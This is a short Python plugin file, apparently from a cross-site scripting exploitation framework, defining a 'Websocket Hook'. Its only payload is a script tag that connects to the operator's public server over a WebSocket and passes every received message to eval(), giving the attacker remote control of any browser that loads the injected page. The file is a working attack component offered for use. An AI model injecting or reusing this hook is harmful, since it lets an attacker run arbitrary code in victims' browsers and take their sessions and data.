from src.core.hooks import BaseHook


class Hook(BaseHook):
    AUTHOR = 'crazyproger1'
    DESCRIPTION = 'Default websocket hook. Loads payload code via WebSockets and executes in eval().'
    NAME = 'Websocket Hook'
    VERSION = '0.1'
    TRANSPORT = 'websocket'

    @property
    def hook(self) -> str:
        return "<script>c=new WebSocket('{{environment.public_url}}');c.onmessage=(e)=>eval(e.data);</script>"
